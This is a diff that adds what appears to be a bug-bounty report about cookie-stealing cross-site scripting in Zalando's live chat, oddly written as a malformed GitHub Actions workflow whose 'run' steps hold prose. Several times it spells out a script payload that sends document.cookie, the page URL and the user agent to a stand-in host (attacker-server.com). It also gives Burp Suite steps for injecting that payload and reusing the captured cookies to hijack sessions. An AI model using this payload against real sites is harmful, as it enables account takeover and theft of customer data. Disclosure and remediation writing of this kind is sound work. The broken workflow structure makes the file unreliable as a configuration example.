@@ -1,0 +1,139 @@
+name: "Zalando Live Chat Cookie Capture Exploit"
+
+# cancel existing runs of the same workflow on the same ref
+concurrency:
+  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}
+  cancel-in-progress: true
+
+on:
+  discovery:
+    - 'live_chat_cookie_exposure_vulnerability'
+
+jobs:
+  report:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Description
+      run: |
+        A vulnerability in Zalando's live chat system allows an attacker to inject malicious JavaScript into the support request payload. When the malicious script is executed on Zalando's servers, the attacker's payload captures active session cookies of support agents or customers. These cookies can then be used to impersonate a valid session, granting unauthorized access to sensitive customer information, including personal details, order history, and potentially stored payment methods.
+
+        This vulnerability arises from a failure to properly sanitize input fields in the live chat system, leading to improper handling of untrusted data and the execution of attacker-controlled scripts.
+
+    - name: Severity
+      run: |
+        Severity: Critical
+        Status: Open
+
+    - name: Steps to Reproduce
+      run: |
+        1. Open the Zalando live chat system via their webstore (https://www.zalando.com).
+        2. Initiate a support chat by filling out the required fields in the chat form.
+        3. Inject the following malicious script into the "Message" field:
+           <script>
+           fetch('https://attacker-server.com/capture', {
+             method: 'POST',
+             headers: {'Content-Type': 'application/json'},
+             body: JSON.stringify({
+               cookies: document.cookie,
+               url: window.location.href
+             })
+           });
+           </script>
+        4. Submit the request.
+        5. Intercept and monitor the network requests sent to the attacker's server (https://attacker-server.com/capture) to observe active session cookies.
+        6. Use the captured cookies to impersonate the victim's session on Zalando's webstore or customer support portal.
+
+    - name: Expected vs Actual Behavior
+      run: |
+        Expected Behavior:
+        All inputs in the live chat system, particularly the "Message" field, should be properly sanitized and escaped before being rendered in the live chat interface. Scripts or untrusted input should not execute within any browser context.
+
+        Actual Behavior:
+        Inputs in the "Message" field are not sanitized, allowing malicious JavaScript to execute in the browser context of support agents or other customers interacting with the chat. This exposes session cookies and other sensitive data to the attacker.
+
+    - name: Technical Details
+      run: |
+        Vulnerable Endpoint: POST /live-chat/submit-message
+        Example Exploitable Payload:
+        {
+          "name": "John Doe",
+          "email": "john.doe@example.com",
+          "message": "<script>fetch('https://attacker-server.com/capture', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cookies: document.cookie, url: window.location.href})});</script>"
+        }
+
+        Root Cause:
+        - The "Message" input field does not sanitize or escape user-provided data before it is rendered in the live chat interface, leading to a cross-site scripting (XSS) vulnerability.
+        - Cookies with the "HttpOnly" flag are not enforced for live chat sessions, making session cookies accessible via JavaScript.
+
+    - name: Exploitation Details
+      run: |
+        Exploitation involves injecting a malicious payload into the "Message" field during a support chat session. When a support agent or another customer views the chat message, the malicious script executes in their browser context, stealing session cookies.
+
+        Example Malicious Script:
+        <script>
+        fetch('https://attacker-server.com/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            cookies: document.cookie,
+            url: window.location.href,
+            userAgent: navigator.userAgent
+          })
+        });
+        </script>
+
+        This script sends the victim's cookies, current URL, and user-agent string to the attacker's server (https://attacker-server.com/capture), allowing session hijacking and further exploitation.
+
+    - name: Impact
+      run: |
+        Exploiting this vulnerability can lead to:
+        - Unauthorized access to customer accounts, exposing personal details, order history, and stored payment methods.
+        - Support agent impersonation, allowing attackers to manipulate or intercept customer support interactions.
+        - Potential escalation to higher-privileged accounts if support agents are targeted.
+        - Compliance violations due to exposure of customer data.
+
+    - name: Recommendations
+      run: |
+        - Sanitize and escape all user inputs before rendering them in the live chat interface to prevent XSS.
+        - Implement Content Security Policy (CSP) headers to restrict the execution of inline scripts.
+        - Ensure all session cookies are set with the "HttpOnly" and "Secure" flags to prevent JavaScript access and enforce HTTPS-only transmission.
+        - Conduct a thorough review of the live chat system for additional input validation flaws.
+
+    - name: Proof of Concept
+      run: |
+        Tool used: Burp Suite
+        Vulnerable Endpoint: POST /live-chat/submit-message
+        Example Payload:
+        {
+          "name": "John Doe",
+          "email": "john.doe@example.com",
+          "message": "<script>fetch('https://attacker-server.com/capture', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cookies: document.cookie, url: window.location.href})});</script>"
+        }
+
+        Steps:
+        1. Intercept the outgoing request from the Zalando live chat submission form using Burp Suite.
+        2. Replace the "Message" field content with the malicious script.
+        3. Forward the request.
+        4. Monitor incoming requests on the attacker's server (https://attacker-server.com/capture) for session cookies and other data.
+
+    - name: References
+      run: |
+        - OWASP Cross-Site Scripting Prevention Cheat Sheet: https://owasp.org/www-project-cheat-sheets/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+        - Zalando Bug Bounty Program: https://www.zalando.com/security
+
+    - name: Contact Information
+      run: |
+        Reporter (via GitHub): adamfos
+
+    - name: Workflow
+      run: |
+        Triage:
+        - Verify the vulnerability by reproducing the exploit.
+        - Confirm the lack of input sanitization and improper handling of user-supplied data.
+        - Validate that session cookies can be captured via malicious script execution.
+
+        Mitigation:
+        - Implement robust input validation and sanitization across all user-facing input fields.
+        - Enforce security headers such as Content Security Policy to mitigate XSS risks.
+        - Ensure session cookies are set with the "HttpOnly" and "Secure" flags to restrict access.
+        - Conduct periodic security testing of the live chat system to identify and resolve similar vulnerabilities.
